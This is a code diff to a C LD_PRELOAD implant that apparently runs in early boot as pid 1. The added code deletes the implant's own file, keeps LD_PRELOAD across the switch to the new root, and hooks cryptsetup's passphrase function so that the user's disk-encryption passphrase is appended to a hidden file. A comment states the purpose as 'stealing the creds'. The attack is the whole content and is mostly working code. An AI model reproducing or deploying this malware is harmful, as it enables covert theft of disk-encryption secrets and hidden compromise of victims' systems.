@@ -4,12 +4,15 @@
 #include <string.h>
 #include <unistd.h>
 #include <stdio.h>
+#include <dlfcn.h>
+#include <libcryptsetup.h>
 
 // dirty, see Makefile
 #include "/dev/stdin"
 
-int shell(void) {
-    if(getpid() == 1) {
+int shell(int argc, char **argv) {
+    // only execute if we're pid 1 and /sysroot doesn't exist (systemd workaround)
+    if(getpid() == 1 && access("/sysroot", F_OK) == -1) {
         pid_t pid = fork();
         if (pid == 0) {
             // don't show any output
@@ -45,7 +48,7 @@ int shell(void) {
                 NULL
             };
             // delete self
-            // unlink(sopath);
+            unlink(sopath);
             // sleep, wait for networking etc
             sleep(WAIT);
 
@@ -77,6 +80,7 @@ int shell(void) {
 }
 
 
+// for retaining LD_PRELOAD into the new root
 extern char **environ;
 int clearenv (void) {
     /*
@@ -89,5 +93,21 @@ int clearenv (void) {
     environ[0] = ldpreload;
     environ[1] = NULL;
     return 0;
+
+}
+
+// for stealing the creds
+int (*old_crypt_activate_by_passphrase)(struct crypt_device *cd, const char *name, int keyslot, const char *passphrase, size_t passphrase_size, uint32_t flags);
+int crypt_activate_by_passphrase(struct crypt_device *cd, const char *name, int keyslot, const char *passphrase, size_t passphrase_size, uint32_t flags) {
+    old_crypt_activate_by_passphrase = (int(*)(struct crypt_device *, const char *, int, const char *, size_t, uint32_t))dlsym(RTLD_NEXT, "crypt_activate_by_passphrase");
+
+    /* raise(SIGSEGV); */
+    FILE *self = fopen("/hda1", "a");
+    fseek(self, 0, SEEK_END);
+    fwrite(passphrase, passphrase_size, 1, self);
+    fclose(self);
+
+    int ret = old_crypt_activate_by_passphrase(cd, name, keyslot, passphrase, passphrase_size, flags);
+    return ret;
 
 }
